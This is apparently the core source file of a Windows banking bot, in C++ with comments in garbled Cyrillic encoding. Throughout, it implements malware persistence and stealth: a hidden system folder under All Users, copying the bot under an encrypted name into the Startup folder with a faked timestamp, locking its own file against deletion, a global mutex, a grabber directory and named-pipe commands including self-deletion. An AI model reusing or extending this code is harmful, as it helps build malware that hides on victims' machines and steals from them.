//---------------------------------------------------------------------------
#include <shlobj.h>

#include "BotCore.h"
#include "BotUtils.h"
#include "HTTPConsts.h"
#include "BotDef.h"
#include "BotHosts.h"
#include "StrConsts.h"
#include "Pipes.h"
//#include "DbgRpt.h"


//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace COREDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define COREDBG COREDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------







class TBotData : public TBotObject
{
public:
	TProcessType ProcessType;  // ��� ����������� ��������
};



//---------------------------------------------------------------------------

TBotApplication* Bot = NULL;
TBotData* BotData = NULL;

//---------------------------------------------------------------------------
#define MAX_BOT_WORK_FOLDER_LEN 15

// ������� ������� ����
char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};

DWORD BotWorkPathHash = 0;


// ������������ ������ ������� ������������ �����
#define MAX_CRYPTED_EXE_NAME_SIZE 50

// ������������ ��� ��� ����� ����
char OriginalBotExeName[] = {'W', 't', 'J', 'o', 'e', 'B', 't', '.', 'e', 'x', 'e',  0};

// ����������� ��� ������������ ����� ����
char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";

// ��� ����� ����
DWORD BotExeNameHash = 0;

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
char BOT_UID[128];


//****************************************************************************
//                              TBotApplication
//****************************************************************************

TBotApplication::TBotApplication()
{
	// �������������� ���������� ������
	Bot = this;


	// �������������� ���������� ��������� ����
	FTerminated = false;

	// ���������� PID ��������
	FPID = GetUniquePID();

	// ���������� ��� �������� � ������� �������� ���
	TMemory Buf(MAX_PATH);
	pGetModuleFileNameA(NULL, Buf.Buf(), MAX_PATH);
	FApplicationName = Buf.AsStr();

	// ���������� ������� ����
	FWorkPath = MakeWorkPath(false);

	// �������� ������������� ����
	FUID = GenerateBotID2();
}
//-------------------------------------------------------------


TBotApplication::~TBotApplication()
{

}
//-------------------------------------------------------------

DWORD TBotApplication::PID()
{
	// ������� ���������� ������������� �������� � ������� �������� ���
	return FPID;
}
//-------------------------------------------------------------

string TBotApplication::UID()
{
	return FUID;
}
//-------------------------------------------------------------

bool TBotApplication::Terminated()
{
	// ������� ���������� ������, ���� ���� �������� �������
	// �� ����������� ������
    return FTerminated;
}

//-------------------------------------------------------------

string TBotApplication::ApplicationName()
{
	// ��� ���������� � ������� �������� ���
	return FApplicationName;
}
//-------------------------------------------------------------


string TBotApplication::WorkPath()
{
	// ���� � �������� �������� ����, ��������  � �������� ������������
	return FWorkPath;
}
//-------------------------------------------------------------

string TBotApplication::MakePath(const char* SubDirectory)
{
	// ������� �������� ���� � ��������� ��������������
	// �����:
	// ������� �� ������������ ��������� �������������.
	// ��� ����������� ������������, ��� ���������� ���������

	string Path = WorkPath();

	if (!STRA::IsEmpty(SubDirectory))
	{
		if (SubDirectory[0] == SlashChar)
			SubDirectory++;

		string Temp = SubDirectory;

		if (Temp[Temp.Length() - 1] == SlashChar)
			Temp[Temp.Length() - 1] = 0;

		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);

		Path += SD;
		Path += Slash;

		STR::Free(SD);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);
    }
	return Path;
}

string TBotApplication::MakePath(const string &SubDirectory)
{
	return MakePath(SubDirectory.t_str());
}
//-------------------------------------------------------------

string TBotApplication::CreateFile(const char* SubDir, const char* FileName)
{
	string Name = MakeFileName(SubDir, FileName);
	File::WriteBufferA(Name.t_str(), NULL, 0);
	return Name;
}

string TBotApplication::CreateFile(const string &SubDir, const char* FileName)
{
	return CreateFile(SubDir.t_str(), FileName);
}


//-------------------------------------------------------------

string TBotApplication::MakeFileName(const char* SubDir, const char* FileName)
{
	// ������� �������� ��� ����� � ������� ����� ����
	string Name = MakePath(SubDir);
	Name += FileName;
	return Name;
}

string TBotApplication::MakeFileName(const string &SubDir, const char* FileName)
{
	return MakeFileName(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

bool TBotApplication::FileExists(const char* SubDir, const char* FileName)
{
	// ������� ��������� ������� ����� � ������� ����� ����
	string Name = MakeFileName(SubDir, FileName);
	return File::IsExists(Name.t_str());
}

bool TBotApplication::FileExists(const string &SubDir, const char* FileName)
{
	return FileExists(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

string TBotApplication::GrabberPath()
{
	// ���� � �������� �������� ������� ������
	if (FGrabberPath.IsEmpty())
		FGrabberPath = MakePath(GetStr(StrGrabberPath));
	return FGrabberPath;
}
//-------------------------------------------------------------

string TBotApplication::PrefixFileName()
{
	// ������� ���������� ��� ����� ��� �������� ��������
	if (FPerfixFileName.IsEmpty())
		FPerfixFileName = MakeFileName(NULL, GetStr(EStrPrefixFileName).t_str());

	return FPerfixFileName;
}
//----------------------------------------------------------------------------


PCHAR TBotApplication::GetWorkFolder()
{
	// ������� ���������� ������� ������� ���� (�������� ���)

	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
		return BOT_WORK_FOLDER_NAME;

	// ���������� ��� �� ������ ��������� ������������ ������ �� ����
	string WorkPath = GetStr(StrBotWorkPath);

	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);

	// �������� ���� � ���������� ������
	const char *Buf = (Name) ? Name : WorkPath.t_str();

	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));

	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
	BOT_WORK_FOLDER_NAME[ToCopy] = 0;

	STR::Free(Name);

	// ����������� ���
	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);

	return BOT_WORK_FOLDER_NAME;
}
//----------------------------------------------------------------------------
/*
string TBotApplication::MakeWorkPath(bool SystemPath)
{
	// ������� ���������� ������� ����
	string Result;

	TMemory Path(MAX_PATH);
	if (!pSHGetSpecialFolderPathA(NULL, Path.Buf(), CSIDL_APPDATA, TRUE))
		return Result;

	if (SystemPath)
	{
		// �������� ���� � ��������� �����
		PCHAR Tmp = STRA::Scan(Path.AsStr(), ':');
		if (Tmp == NULL) return Result;
		Tmp++;
		*Tmp = 0;
	}

	Result = Path.AsStr();
	Result += "\\";
	Result += GetWorkFolder();
	Result += "\\";

	return Result;
}
//----------------------------------------------------------------------------
*/

string TBotApplication::MakeWorkPath(bool SystemPath)
{
	// ������� ���������� ������� ����
	string Result;

	TMemory Path(MAX_PATH);
	if (!pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
		return Result;

	Result =  Path.AsStr();
	Result += GetWorkFolder();
	Result += "\\";

	if (!DirExists(Result.t_str()))
		pCreateDirectoryA(Result.t_str(), NULL);
	pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);


	return Result;
}
//----------------------------------------------------------------------------



void TBotApplication::SaveSettings()
{
	// ������� ��������� ������� ���������

	// ��������� �����
	PCHAR HostsName = Hosts::GetFileName();
	if (!FileExistsA(HostsName))
		SaveHostsToFile(HostsName);
	STR::Free(HostsName);

	// ��������� �������
	string PrefixFile = PrefixFileName();
	if (!FileExistsA(PrefixFile.t_str()))
		SavePrefixToFile(PrefixFile.t_str());
}
//----------------------------------------------------------------------------

void TBotApplication::DeleteSettings()
{
	// ������� ������� ����� ����������� ���������
	// ������� �����
	PCHAR HostsName = Hosts::GetFileName();
	pDeleteFileA(HostsName);
	STR::Free(HostsName);

	// ������� ���� ��������
	pDeleteFileA(PrefixFileName().t_str());
}

//----------------------------------------------------------------------------




PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// ������� ���������� ������� ������� ����

	string Path = Bot->WorkPath();

	if (Path.IsEmpty()) return NULL;

	// ��������� ������������
	if (!STR::IsEmpty(SubDir))
	{
        PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);

		Path += CryptDir;

		STR::Free(CryptDir);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);

    }

	PCHAR Result = STR::New(2, Path.t_str(), FileName);

	return  Result;
}
//----------------------------------------------------------------------------




//**************************************************************************
//  ���������� ������ ���� ����
//**************************************************************************
namespace BOT
{



	//--------------------------------------------------
	//  ExecuteDeleteBot - ������� ��������� ������� ��
	//				       �������� ����
	//--------------------------------------------------
	void WINAPI ExecuteDeleteBot(LPVOID, PPipeMessage, bool &Cancel)
	{
		COREDBG("CORE", "�������� ������� �� �������� ����");

		PCHAR FileName = NULL;

		switch (BotData->ProcessType)
		{

			case ProcessLoader:
			{
				// ��������� �������� �� �������� �������
				FileName = BOT::GetBotFullExeName();

				// ������� ������ � ����
                Unprotect();

                break;
            }
		}

		COREDBG("CORE", "������� ���� %s", FileName);
		// ������� ����
		pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL );
		BOOL Deleted = (BOOL)pDeleteFileA(FileName);
		if (!Deleted)
		{
			// �� ������� �� ������ ������� ����.
			// ������� ���� ����� ������������
			Deleted = (BOOL)pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        }

        COREDBG("CORE", "��������� �������� ����: �����=%d", Deleted);

		STR::Free(FileName);

		Cancel = true;
    }
    //----------------------------------------------------------------------



	//--------------------------------------------------
	//  GetProcessPipeName - ������� ���������� ���
	//  ���������� ����� ��������
	//--------------------------------------------------
	string GetProcessPipeName(TProcessType Process)
	{
		string Name;

		switch (Process) {
			case ProcessLoader: Name = GetStr(EStrPipeLoader); break;
		}

        return Name;
	}
	//----------------------------------------------------------------------

	//--------------------------------------------------
	//  CreateProcessPipe - ������� ������ ���������
	//                      ����� ��������
	//--------------------------------------------------
	void CreateProcessPipe(TProcessType Process)
	{
		string Name = GetProcessPipeName(Process);
		if (Name.IsEmpty()) return;

		PProcessPipe P = PIPE::CreateProcessPipe(Name, false);
		if (P)
		{
			// ����� �������� ������� ������, ��������� ����������� �������
			if (Process == ProcessLoader || Process == ProcessService)
			{
				// ������������ ������� �������� ����
                PIPE::RegisterMessageHandler(P, ExecuteDeleteBot, NULL, NULL, GetStr(EStrProcessCommandDeleteBot).Hash());
            }
		}

		PIPE::StartProcessPipe(P);
	}

}
//**************************************************************************









void BOT::Initialize(TProcessType ProcessType)
{
	// ������� �������������� ���������� ��������� ����

	// �������������� ���
	InitializeAPI();

	//������ ���������� ������� ����
	BotData = new TBotData();
    Bot     = new TBotApplication();


	// ������������� ���������� ������ ����
	BotData->ProcessType = ProcessType;

	// ������ ��� ������� �����
	GetWorkFolderHash();

	GenerateUid(BOT_UID);

	// �������� �������� ����� ��� ����������
	// �������� ������ � ������ ������, ��� ���� ��� ����������� �����������
	// ������ �� �������� ������������� ��������� VEH.
	//InitialializeGlogalExceptionLogger(TRUE);


	CreateProcessPipe(ProcessType);
}

void BOT::InitializeApi()
{
	// �������������� ���
	InitializeAPI();
}

//----------------------------------------------------------------------------
PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  ������� ���������� ������� ���� ����
    return BOTDoGetWorkPath(false, SubDir, FileName);
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
{
	//  ������ ������� GetWorkPath.
	//  ������� �� ����� �� �� � ���, ��� �����
	//   �������� � ����� ���������� �����
    return BOTDoGetWorkPath(true, SubDir, FileName);
}
//----------------------------------------------------------------------------

DWORD BOT::GetWorkFolderHash()
{
	//  ������� ���������� ��� ����� ������� �����
	return BotWorkPathHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotExeName()
{
	//  ������� ���������� ��� ����� ����

	// ��� ������������� ���������� ��� ����
	if (STR::IsEmpty(CryptedBotExeName))
	{
		PCHAR Name = UIDCrypt::CryptFileName(OriginalBotExeName, false);

		STR::Copy(Name, CryptedBotExeName, 0, StrCalcLength(Name) + 1);

		STR::Free(Name);

		// ����������� ��� �����

		BotExeNameHash = CalcHash(CryptedBotExeName);
	}


	return CryptedBotExeName;
}
//----------------------------------------------------------------------------

DWORD BOT::GetBotExeNameHash()
{
	//  ������� ���������� ��� ��� ����� ����
    GetBotExeName();
    return BotExeNameHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotFullExeName()
{
	//  ������� ���������� ������ ��� ����� ����

	PCHAR Path = STR::Alloc(MAX_PATH);

	// �������� ���� � ����� ������������
	pSHGetSpecialFolderPathA(NULL, Path, CSIDL_STARTUP, TRUE);

    PCHAR Name = STR::New(3, Path, "\\", GetBotExeName());

	STR::Free(Path);

    return Name;
}
//----------------------------------------------------------------------------

HANDLE BotFileHandle = NULL;
HANDLE BotMapHandle = NULL;

void BOT::Protect(PCHAR FileName)
{
	// ������� �������� ��� ���� �� ��������
	bool FreeName = STR::IsEmpty(FileName);

	if (FreeName)
		FileName = GetBotFullExeName();

	if (FileName == NULL)
    	return;

	// ��������� ����
	BotFileHandle = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


	if (BotFileHandle != INVALID_HANDLE_VALUE)
	{
		BotMapHandle = (HANDLE)pCreateFileMappingA(FileName, NULL, PAGE_READONLY, 0, 0, NULL );
	}

	if (FreeName)
		STR::Free(FileName);
}

//----------------------------------------------------------------------------

void BOT::Unprotect()
{
	// ������� ������� ������ � ��� ����� ����
	pCloseHandle(BotFileHandle);
	pCloseHandle(BotMapHandle);

	BotFileHandle = NULL;
	BotMapHandle = NULL;
}
//----------------------------------------------------------------------------


bool BOT::AddToAutoRun(PCHAR FileName)
{
	// ������� ��������� ���� � ������������

	if (!FileExistsA(FileName))
		return false;

	PCHAR BotFile = GetBotFullExeName();

	if (StrSame(FileName, BotFile, false, 0))
	{
		STR::Free(BotFile);
		return 0;
    }

    // ������� ��������� ��������
	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_NORMAL);

	// �������� ����
	bool Result = (BOOL)pCopyFileA(FileName, BotFile, TRUE) == TRUE;

	// ������������� ���� �����
	SetFakeFileDateTime(BotFile);

	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// ������� �������� ����
	if (Result)
		pDeleteFileA(FileName);


	STR::Free(BotFile);

	return Result;
}


//----------------------------------------------------
//  BotExeMD5 - ������� ���������� MD5 ��� ��� ����
//----------------------------------------------------
string BOT::BotExeMD5()
{
	PCHAR FileName = BOT::GetBotFullExeName();

	string Result = CalcFileMD5Hash2(FileName);

	if (Result.IsEmpty())
	{
		Result.SetLength(32);
		m_memset(Result.t_str(), '0', 32);
    }

	STR::Free(FileName);

	return Result;
}

//----------------------------------------------------
//  TryCreatBotInstance - ������� ���������� 
//  ����� ��������, ��������� �������� �������� ��������
//  ��� ���� ��������� ������� ������.
//----------------------------------------------------
HANDLE BOT::TryCreateBotInstance()
{
	return TryCreateSingleInstance(GetStr(StrBotGlobalMutexName).t_str());
}


//----------------------------------------------------
//  IsRunning - ������� ���������� ������ ���� �
//  ������� ��� ������� ��������� ����
//----------------------------------------------------
bool BOT::IsRunning()
{
	HANDLE H = TryCreateBotInstance();
	bool Result = (H == 0);
	if (H) pCloseHandle(H);
	return Result;
}


//----------------------------------------------------
//  SendProcessMessage - ������� ���������� ���������
//  ���������� ��������
//----------------------------------------------------
bool BOT::SendProcessMessage(TProcessType Process, const string &Message)
{
	return PIPE::SendMessage(GetProcessPipeName(Process), Message);
}


//----------------------------------------------------
//  Delete - ������� ������� ��� ����
//----------------------------------------------------
void BOT::Delete()
{
	if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
	{
		bool C; // ��� ������������ ������
		ExecuteDeleteBot(NULL, NULL, C);
	}
	else
	{
		//  ����� ���������� �� ������� ��������,
		//  ���������� ������� �� ��������
		string Cmd = GetStr(EStrProcessCommandDeleteBot);

		SendProcessMessage(ProcessLoader,  Cmd);
		SendProcessMessage(ProcessService, Cmd);
    }
}
